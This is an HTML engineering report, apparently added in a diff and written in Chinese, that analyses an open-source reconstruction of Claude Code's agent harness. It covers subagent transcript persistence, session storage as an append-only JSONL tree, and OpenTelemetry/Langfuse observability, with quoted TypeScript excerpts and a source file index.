+        <div class="fact-block"><span class="mini-label">源码事实</span><p>runAgent 将初始/新增消息写入独立 sidechain JSONL，并记录 agentType、worktreePath、description；finally 结束 Langfuse trace，关闭 agent MCP、hooks、缓存、文件状态、todo、shell/monitor tasks。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>后台工人有自己的工作日志，重启后能知道它是谁、在哪个工位；收工时也会回收插座、进程和临时账本。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>生命周期工程较完整，适合长会话和大量 worker；清理路径任何漏项都可能成为进程或内存泄漏。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">packages/builtin-tools/src/tools/AgentTool/runAgent.ts · L741–L773</div>
+        <pre><code>  741    // Record initial messages before the query loop starts, plus the agentType
+  742    // so resume can route correctly when subagent_type is omitted. Both writes
+  743    // are fire-and-forget — persistence failure shouldn&#39;t block the agent.
+  744    void recordSidechainTranscript(initialMessages, agentId).catch(_err =&gt;
+  745      logForDebugging(`Failed to record sidechain transcript: ${_err}`),
+  746    )
+  747    void writeAgentMetadata(agentId, {
+  748      agentType: agentDefinition.agentType,
+  749      ...(worktreePath &amp;&amp; { worktreePath }),
+  750      ...(description &amp;&amp; { description }),
+  751    }).catch(_err =&gt; logForDebugging(`Failed to write agent metadata: ${_err}`))
+  752  
+  753    // Track the last recorded message UUID for parent chain continuity
+  754    let lastRecordedUuid: UUID | null = initialMessages.at(-1)?.uuid ?? null
+  755  
+  756    // Create Langfuse sub-agent trace (no-op if not configured).
+  757    // Sub-agent trace shares the same sessionId as the parent, so Langfuse
+  758    // groups them under the same Session view.
+  759    const subTrace = isLangfuseEnabled()
+  760      ? createSubagentTrace({
+  761          sessionId: getSessionId(),
+  762          agentType: agentDefinition.agentType,
+  763          agentId,
+  764          model: resolvedAgentModel,
+  765          provider: getAPIProvider(),
+  766          input: initialMessages,
+  767        })
+  768      : null
+  769  
+  770    // Attach sub-agent trace to toolUseContext so query() reuses it
+  771    if (subTrace) {
+  772      agentToolUseContext.langfuseTrace = subTrace
+  773    }</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:741–773</code>
+      <span>sidechain、metadata 和 Langfuse。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:775–834</code>
+      <span>query 输出持久化。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:844–889</code>
+      <span>完整资源清理。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-10">
+      <div class="chapter-rule"><span>10</span></div>
+      <div class="chapter-kicker">DIMENSION · SESSION-OBSERVABILITY</div>
+      <h2>会话与观测</h2>
+      <p class="chapter-deck">本章共 2 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-session-001" data-search="会话是 append-only jsonl 树，而不是简单聊天数组 主会话与每个 agent 各有 jsonl；消息用 parentuuid 建链，compact boundary、file history、attribution、mode、content replacement 等都作为条目追加；resume 会修复旧 progress fork、snip gap 和孤儿并行 tool result。 日志更像带分叉的版本树：可以从某个节点继续、压缩或恢复文件快照，不只是从头到尾的一串气泡。 session-observability">
+    <header class="finding-head">
+      <div class="finding-no">24</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-session-001</span></div>
+        <h3>会话是 append-only JSONL 树，而不是简单聊天数组</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>主会话与每个 agent 各有 JSONL；消息用 parentUuid 建链，compact boundary、file history、attribution、mode、content replacement 等都作为条目追加；resume 会修复旧 progress fork、snip gap 和孤儿并行 tool result。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>日志更像带分叉的版本树：可以从某个节点继续、压缩或恢复文件快照，不只是从头到尾的一串气泡。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>可恢复性很强，但 parentUuid 一致性是核心不变量，代码中大量修复逻辑也说明这里是高风险复杂区。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 契约</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/sessionStorage.ts · L130–L168</div>
+        <pre><code>  130   * Type guard to check if an entry is a transcript message.
+  131   * Transcript messages include user, assistant, attachment, and system messages.
+  132   * IMPORTANT: This is the single source of truth for what constitutes a transcript message.
+  133   * loadTranscriptFile() uses this to determine which messages to load into the chain.
+  134   *
+  135   * Progress messages are NOT transcript messages. They are ephemeral UI state
+  136   * and must not be persisted to the JSONL or participate in the parentUuid
+  137   * chain. Including them caused chain forks that orphaned real conversation
+  138   * messages on resume (see #14373, #23537).
+  139   */
+  140  export function isTranscriptMessage(entry: Entry): entry is TranscriptMessage {
+  141    return (
+  142      entry.type === &#39;user&#39; ||
+  143      entry.type === &#39;assistant&#39; ||
+  144      entry.type === &#39;attachment&#39; ||
+  145      entry.type === &#39;system&#39;
+  146    )
+  147  }
+  148  
+  149  /**
+  150   * Entries that participate in the parentUuid chain. Used on the write path
+  151   * (insertMessageChain, useLogMessages) to skip progress when assigning
+  152   * parentUuid. Old transcripts with progress already in the chain are handled
+  153   * by the progressBridge rewrite in loadTranscriptFile.
+      … 5 lines omitted; exact range 130–168 …
+  159  type LegacyProgressEntry = {
+  160    type: &#39;progress&#39;
+  161    uuid: UUID
+  162    parentUuid: UUID | null
+  163  }
+  164  
+  165  /**
+  166   * Progress entries in transcripts written before PR #24099. They are not
+  167   * in the Entry type union anymore but still exist on disk with uuid and
+  168   * parentUuid fields. loadTranscriptFile bridges the chain across them.</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 4 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">契约</span>
+      <code>src/utils/sessionStorage.ts:130–168</code>
+      <span>transcript entry 与 parentUuid 不变量。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/sessionStorage.ts:1023–1090</code>
+      <span>消息追加、compact boundary 和会话 stamp。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/sessionStorage.ts:1997–2073</code>
+      <span>snip 后 parentUuid relink。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/sessionStorage.ts:2110–2130</code>
+      <span>从 leaf 重建会话链与循环检测。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-observability-001" data-search="开源复原代码中仍有可用 otel/perfetto/langfuse，但内部 analytics 不可等同 instrumentation 支持 metrics/logs/traces 的 console、otlp grpc/http、prometheus 等 exporter；agent 层注册 perfetto 层级并可创建 langfuse subtrace。与此同时仓库自述 analytics/growthbook/sentry 为 empty implementations。 标准观测管道是真代码，可以接企业采集；原厂内部埋点名字很多，但这个仓库里的后端并不完整。 session-observability">
+    <header class="finding-head">
+      <div class="finding-no">25</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-observability-001</span></div>
+        <h3>开源复原代码中仍有可用 OTEL/Perfetto/Langfuse，但内部 analytics 不可等同</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>instrumentation 支持 metrics/logs/traces 的 console、OTLP grpc/http、Prometheus 等 exporter；Agent 层注册 Perfetto 层级并可创建 Langfuse subtrace。与此同时仓库自述 Analytics/GrowthBook/Sentry 为 empty implementations。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>标准观测管道是真代码，可以接企业采集；原厂内部埋点名字很多，但这个仓库里的后端并不完整。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>评价时应把开放标准观测与不可用的内部遥测分开，不能因大量 logEvent 调用就认定原厂分析链已复现。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/telemetry/instrumentation.ts · L1–L71</div>
+        <pre><code>    1  import { DiagLogLevel, diag, trace } from &#39;@opentelemetry/api&#39;
+    2  import { logs } from &#39;@opentelemetry/api-logs&#39;
+    3  // OTLP/Prometheus exporters are dynamically imported inside the protocol
+    4  // switch statements below. A process uses at most one protocol variant per
+    5  // signal, but static imports would load all 6 (~1.2MB) on every startup.
+    6  import {
+    7    envDetector,
+    8    hostDetector,
+    9    osDetector,
+   10    resourceFromAttributes,
+   11  } from &#39;@opentelemetry/resources&#39;
+   12  import {
+   13    BatchLogRecordProcessor,
+   14    ConsoleLogRecordExporter,
+   15    LoggerProvider,
+   16  } from &#39;@opentelemetry/sdk-logs&#39;
+   17  import {
+   18    ConsoleMetricExporter,
+   19    MeterProvider,
+   20    PeriodicExportingMetricReader,
+   21  } from &#39;@opentelemetry/sdk-metrics&#39;
+   22  import {
+   23    BasicTracerProvider,
+   24    BatchSpanProcessor,
+      … 37 lines omitted; exact range 1–71 …
+   62  import { ClaudeCodeDiagLogger } from &#39;./logger.js&#39;
+   63  import { initializePerfettoTracing } from &#39;./perfettoTracing.js&#39;
+   64  import {
+   65    endInteractionSpan,
+   66    isEnhancedTelemetryEnabled,
+   67  } from &#39;./sessionTracing.js&#39;
+   68  
+   69  const DEFAULT_METRICS_EXPORT_INTERVAL_MS = 60000
+   70  const DEFAULT_LOGS_EXPORT_INTERVAL_MS = 5000
+   71  const DEFAULT_TRACES_EXPORT_INTERVAL_MS = 5000</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 5 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/telemetry/instrumentation.ts:1–71</code>
+      <span>OTEL logs/metrics/traces 依赖和默认周期。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/telemetry/instrumentation.ts:119–205</code>
+      <span>console/OTLP/Prometheus metrics exporter。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:356–368</code>
+      <span>Perfetto agent hierarchy。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:756–773</code>
+      <span>Langfuse sub-agent trace。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>AGENTS.md:252–264</code>
+      <span>内部 analytics/GrowthBook/Sentry 空实现。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+  </div>
+
+  <section class="chapter source-index" id="sources">
+    <div class="chapter-kicker">APPENDIX · SOURCE INDEX</div>
+    <h2>本报告引用过的实现文件</h2>
+    <p class="chapter-deck">这是一份代码阅读索引，不是仓库文件总表。机器候选扫描覆盖整个仓库；进入结论的文件必须经人工沿调用链复核。</p>
+    <ol><li><span>01</span><code>AGENTS.md</code><small>L1–8, 252–264, 252–264, 5–8</small></li><li><span>02</span><code>src/query.ts</code><small>L460–666, 668–882, 1557–1803, 971–1124, 1158–1245, 1352–1450</small></li><li><span>03</span><code>src/services/api/claude.ts</code><small>L1321–1325, 1282–1338, 1340–1381, 1635–1640, 818–925, 2418–2465, 2583–2667, 1210–1235, 1258–1277, 1388–1415</small></li><li><span>04</span><code>src/services/compact/snipCompact.ts</code><small>L60–147</small></li><li><span>05</span><code>src/services/compact/microCompact.ts</code><small>L38–50, 257–307, 309–402</small></li><li><span>06</span><code>src/services/compact/autoCompact.ts</code><small>L270–363, 28–93, 96–174, 286–293, 189–268</small></li><li><span>07</span><code>src/tools.ts</code><small>L378–420</small></li><li><span>08</span><code>src/utils/permissions/permissions.ts</code><small>L1179–1281, 1283–1340, 502–540, 392–470</small></li><li><span>09</span><code>src/hooks/useCanUseTool.tsx</code><small>L154–197</small></li><li><span>10</span><code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts</code><small>L421–472, 509–673, 675–751, 741–773, 775–834, 844–889, 356–368, 756–773</small></li><li><span>11</span><code>src/utils/sandbox/sandbox-adapter.ts</code><small>L1–22, 459–485, 528–547</small></li><li><span>12</span><code>src/utils/hooks.ts</code><small>L1041–1088</small></li><li><span>13</span><code>packages/builtin-tools/src/tools/BashTool/shouldUseSandbox.ts</code><small>L18–20, 130–152</small></li><li><span>14</span><code>src/services/mcp/client.ts</code><small>L596–678, 709–905, 1030–1110, 210–229, 462–530</small></li><li><span>15</span><code>src/services/mcp/config.ts</code><small>L214–309, 336–430</small></li><li><span>16</span><code>src/context.ts</code><small>L36–111, 113–150, 152–188</small></li><li><span>17</span><code>src/utils/plugins/pluginLoader.ts</code><small>L1–29, 912–1092, 1314–1389</small></li><li><span>18</span><code>src/skills/loadSkillsDir.ts</code><small>L78–108, 182–260, 986–1054</small></li><li><span>19</span><code>packages/builtin-tools/src/tools/AgentTool/loadAgentsDir.ts</code><small>L58–132</small></li><li><span>20</span><code>packages/builtin-tools/src/tools/AgentTool/forkSubagent.ts</code><small>L18–71, 95–175</small></li><li><span>21</span><code>packages/builtin-tools/src/tools/AgentTool/AgentTool.tsx</code><small>L696–827, 829–912</small></li><li><span>22</span><code>src/utils/sessionStorage.ts</code><small>L130–168, 1023–1090, 1997–2073, 2110–2130</small></li><li><span>23</span><code>src/utils/telemetry/instrumentation.ts</code><small>L1–71, 119–205</small></li><li><span>24</span><code>src/services/compact/__tests__/snipCompact.test.ts</code><small>L1–80</small></li><li><span>25</span><code>src/utils/permissions/__tests__/permissions.test.ts</code><small>L1–80</small></li><li><span>26</span><code>packages/builtin-tools/src/tools/AgentTool/__tests__/resumeAgent.test.ts</code><small>L1–20</small></li></ol>
+  </section>
+
+  <footer class="report-footer">
+    <div><span>SNAPSHOT</span><code>53f347d34666e847405714095020afdfadb95503</code></div>
+    <nav>
+      <a href="oh-my-pi.html">← Oh My Pi</a>
+      <a href="pi.html">Pi →</a>
+    </nav>
+  </footer>
+  </main>
+  <script src="../assets/report.js"></script>
+</body>
+</html>
